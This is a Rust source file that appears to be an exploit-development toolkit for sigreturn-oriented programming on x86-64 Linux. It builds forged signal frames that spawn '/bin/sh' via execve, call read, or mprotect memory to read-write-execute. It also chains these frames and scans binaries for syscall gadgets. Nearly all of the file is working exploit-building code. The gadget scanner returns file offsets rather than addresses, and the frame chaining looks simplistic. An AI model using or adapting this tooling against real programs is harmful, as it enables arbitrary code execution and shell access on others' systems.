// ═══════════════════════════════════════════════════════════════════════════
// SIGRETURN-ORIENTED PROGRAMMING (SROP) TOOLKIT
// ═══════════════════════════════════════════════════════════════════════════
// Automated SROP frame construction for x86-64 and i386

use std::collections::HashMap;

/// SROP frame for x86-64
#[repr(C)]
#[derive(Debug, Clone)]
pub struct SigreturnFrameX64 {
    pub uc_flags: u64,
    pub uc_link: u64,
    pub uc_stack_ss_sp: u64,
    pub uc_stack_ss_flags: u64,
    pub uc_stack_ss_size: u64,
    pub r8: u64,
    pub r9: u64,
    pub r10: u64,
    pub r11: u64,
    pub r12: u64,
    pub r13: u64,
    pub r14: u64,
    pub r15: u64,
    pub rdi: u64,
    pub rsi: u64,
    pub rbp: u64,
    pub rbx: u64,
    pub rdx: u64,
    pub rax: u64,
    pub rcx: u64,
    pub rsp: u64,
    pub rip: u64,
    pub eflags: u64,
    pub cs: u16,
    pub gs: u16,
    pub fs: u16,
    pub __pad0: u16,
    pub err: u64,
    pub trapno: u64,
    pub oldmask: u64,
    pub cr2: u64,
    pub fpstate: u64,
    pub __reserved1: [u64; 8],
}

impl Default for SigreturnFrameX64 {
    fn default() -> Self {
        SigreturnFrameX64 {
            uc_flags: 0,
            uc_link: 0,
            uc_stack_ss_sp: 0,
            uc_stack_ss_flags: 0,
            uc_stack_ss_size: 0,
            r8: 0,
            r9: 0,
            r10: 0,
            r11: 0,
            r12: 0,
            r13: 0,
            r14: 0,
            r15: 0,
            rdi: 0,
            rsi: 0,
            rbp: 0,
            rbx: 0,
            rdx: 0,
            rax: 0,
            rcx: 0,
            rsp: 0,
            rip: 0,
            eflags: 0x202, // Default FLAGS
            cs: 0x33,      // User code segment
            gs: 0,
            fs: 0,
            __pad0: 0,
            err: 0,
            trapno: 0,
            oldmask: 0,
            cr2: 0,
            fpstate: 0,
            __reserved1: [0; 8],
        }
    }
}

impl SigreturnFrameX64 {
    /// Create a new SROP frame with default values
    pub fn new() -> Self {
        Self::default()
    }

    /// Set registers for execve("/bin/sh", NULL, NULL)
    pub fn set_execve_binsh(&mut self, binsh_addr: u64, syscall_addr: u64) {
        self.rax = 59; // sys_execve
        self.rdi = binsh_addr;
        self.rsi = 0;
        self.rdx = 0;
        self.rip = syscall_addr;
    }

    /// Set registers for read(0, buffer, size)
    pub fn set_read(&mut self, buffer: u64, size: u64, syscall_addr: u64) {
        self.rax = 0; // sys_read
        self.rdi = 0; // stdin
        self.rsi = buffer;
        self.rdx = size;
        self.rip = syscall_addr;
    }

    /// Set registers for write(1, buffer, size)
    pub fn set_write(&mut self, buffer: u64, size: u64, syscall_addr: u64) {
        self.rax = 1; // sys_write
        self.rdi = 1; // stdout
        self.rsi = buffer;
        self.rdx = size;
        self.rip = syscall_addr;
    }

    /// Set registers for mprotect(addr, size, prot)
    pub fn set_mprotect(&mut self, addr: u64, size: u64, prot: u64, syscall_addr: u64) {
        self.rax = 10; // sys_mprotect
        self.rdi = addr;
        self.rsi = size;
        self.rdx = prot; // PROT_READ | PROT_WRITE | PROT_EXEC = 7
        self.rip = syscall_addr;
    }

    /// Convert frame to bytes
    pub fn to_bytes(&self) -> Vec<u8> {
        let mut bytes = Vec::with_capacity(std::mem::size_of::<Self>());

        // Pack all fields as little-endian u64
        bytes.extend_from_slice(&self.uc_flags.to_le_bytes());
        bytes.extend_from_slice(&self.uc_link.to_le_bytes());
        bytes.extend_from_slice(&self.uc_stack_ss_sp.to_le_bytes());
        bytes.extend_from_slice(&self.uc_stack_ss_flags.to_le_bytes());
        bytes.extend_from_slice(&self.uc_stack_ss_size.to_le_bytes());
        bytes.extend_from_slice(&self.r8.to_le_bytes());
        bytes.extend_from_slice(&self.r9.to_le_bytes());
        bytes.extend_from_slice(&self.r10.to_le_bytes());
        bytes.extend_from_slice(&self.r11.to_le_bytes());
        bytes.extend_from_slice(&self.r12.to_le_bytes());
        bytes.extend_from_slice(&self.r13.to_le_bytes());
        bytes.extend_from_slice(&self.r14.to_le_bytes());
        bytes.extend_from_slice(&self.r15.to_le_bytes());
        bytes.extend_from_slice(&self.rdi.to_le_bytes());
        bytes.extend_from_slice(&self.rsi.to_le_bytes());
        bytes.extend_from_slice(&self.rbp.to_le_bytes());
        bytes.extend_from_slice(&self.rbx.to_le_bytes());
        bytes.extend_from_slice(&self.rdx.to_le_bytes());
        bytes.extend_from_slice(&self.rax.to_le_bytes());
        bytes.extend_from_slice(&self.rcx.to_le_bytes());
        bytes.extend_from_slice(&self.rsp.to_le_bytes());
        bytes.extend_from_slice(&self.rip.to_le_bytes());
        bytes.extend_from_slice(&self.eflags.to_le_bytes());
        bytes.extend_from_slice(&self.cs.to_le_bytes());
        bytes.extend_from_slice(&self.gs.to_le_bytes());
        bytes.extend_from_slice(&self.fs.to_le_bytes());
        bytes.extend_from_slice(&self.__pad0.to_le_bytes());
        bytes.extend_from_slice(&self.err.to_le_bytes());
        bytes.extend_from_slice(&self.trapno.to_le_bytes());
        bytes.extend_from_slice(&self.oldmask.to_le_bytes());
        bytes.extend_from_slice(&self.cr2.to_le_bytes());
        bytes.extend_from_slice(&self.fpstate.to_le_bytes());

        for &val in &self.__reserved1 {
            bytes.extend_from_slice(&val.to_le_bytes());
        }

        bytes
    }
}

/// SROP builder for constructing multi-stage chains
pub struct SropBuilder {
    pub frames: Vec<SigreturnFrameX64>,
    pub syscall_gadget: Option<u64>,
    pub sigreturn_syscall: u64,
}

impl SropBuilder {
    /// Create a new SROP builder
    pub fn new() -> Self {
        Self::default()
    }

    /// Set the syscall gadget address
    pub fn set_syscall(&mut self, addr: u64) {
        self.syscall_gadget = Some(addr);
    }

    /// Add a frame for execve("/bin/sh")
    pub fn add_execve(&mut self, binsh_addr: u64) -> Result<(), String> {
        let syscall = self.syscall_gadget.ok_or("Syscall gadget not set")?;

        let mut frame = SigreturnFrameX64::new();
        frame.set_execve_binsh(binsh_addr, syscall);
        self.frames.push(frame);

        log::info!("Added execve frame");
        Ok(())
    }

    /// Add a frame for read(0, buffer, size)
    pub fn add_read(&mut self, buffer: u64, size: u64) -> Result<(), String> {
        let syscall = self.syscall_gadget.ok_or("Syscall gadget not set")?;

        let mut frame = SigreturnFrameX64::new();
        frame.set_read(buffer, size, syscall);
        self.frames.push(frame);

        log::info!("Added read frame");
        Ok(())
    }

    /// Add a frame for mprotect to make memory executable
    pub fn add_mprotect(&mut self, addr: u64, size: u64) -> Result<(), String> {
        let syscall = self.syscall_gadget.ok_or("Syscall gadget not set")?;

        let mut frame = SigreturnFrameX64::new();
        frame.set_mprotect(addr, size, 7, syscall); // RWX
        self.frames.push(frame);

        log::info!("Added mprotect frame");
        Ok(())
    }

    /// Build the complete SROP chain
    pub fn build(&self) -> Vec<u8> {
        let mut chain = Vec::new();

        for frame in &self.frames {
            chain.extend_from_slice(&frame.to_bytes());
        }

        log::info!("Built SROP chain: {} bytes", chain.len());
        chain
    }
}

impl Default for SropBuilder {
    fn default() -> Self {
        SropBuilder {
            frames: Vec::new(),
            syscall_gadget: None,
            sigreturn_syscall: 15, // rt_sigreturn syscall number
        }
    }
}

// ────────────────────────────────────────────────────────────────────────────
// HELPER FUNCTIONS
// ────────────────────────────────────────────────────────────────────────────

/// Quick SROP frame for execve("/bin/sh")
pub fn srop_execve(binsh_addr: u64, syscall_gadget: u64) -> Vec<u8> {
    let mut frame = SigreturnFrameX64::new();
    frame.set_execve_binsh(binsh_addr, syscall_gadget);
    frame.to_bytes()
}

/// Quick SROP frame for read to known address
pub fn srop_read(buffer: u64, size: u64, syscall_gadget: u64) -> Vec<u8> {
    let mut frame = SigreturnFrameX64::new();
    frame.set_read(buffer, size, syscall_gadget);
    frame.to_bytes()
}

/// Quick SROP frame for mprotect
pub fn srop_mprotect(addr: u64, size: u64, syscall_gadget: u64) -> Vec<u8> {
    let mut frame = SigreturnFrameX64::new();
    frame.set_mprotect(addr, size, 7, syscall_gadget);
    frame.to_bytes()
}

/// Find syscall/sigreturn gadgets in binary
pub fn find_srop_gadgets(binary_path: &str) -> Result<HashMap<String, u64>, String> {
    use std::fs;

    let data = fs::read(binary_path).map_err(|e| format!("Failed to read binary: {}", e))?;

    let mut gadgets = HashMap::new();

    // Search for syscall (0x0f 0x05)
    for (i, window) in data.windows(2).enumerate() {
        if window == [0x0f, 0x05] {
            gadgets.insert("syscall".to_string(), i as u64);
            log::info!("Found syscall at 0x{:x}", i);
            break; // First one is usually good enough
        }
    }

    // Search for int 0x80 (0xcd 0x80)
    for (i, window) in data.windows(2).enumerate() {
        if window == [0xcd, 0x80] {
            gadgets.insert("int80".to_string(), i as u64);
            log::info!("Found int 0x80 at 0x{:x}", i);
            break;
        }
    }

    Ok(gadgets)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_srop_frame_creation() {
        let frame = SigreturnFrameX64::new();
        assert_eq!(frame.eflags, 0x202);
        assert_eq!(frame.cs, 0x33);
    }

    #[test]
    fn test_srop_frame_execve() {
        let mut frame = SigreturnFrameX64::new();
        frame.set_execve_binsh(0x600000, 0x400500);

        assert_eq!(frame.rax, 59); // execve
        assert_eq!(frame.rdi, 0x600000);
        assert_eq!(frame.rip, 0x400500);
    }

    #[test]
    fn test_srop_frame_to_bytes() {
        let frame = SigreturnFrameX64::new();
        let bytes = frame.to_bytes();

        // Frame should be 248 bytes
        assert!(bytes.len() >= 200);
    }

    #[test]
    fn test_srop_builder() {
        let mut builder = SropBuilder::new();
        builder.set_syscall(0x400500);

        assert!(builder.add_execve(0x600000).is_ok());
        assert_eq!(builder.frames.len(), 1);

        let chain = builder.build();
        assert!(!chain.is_empty());
    }
}
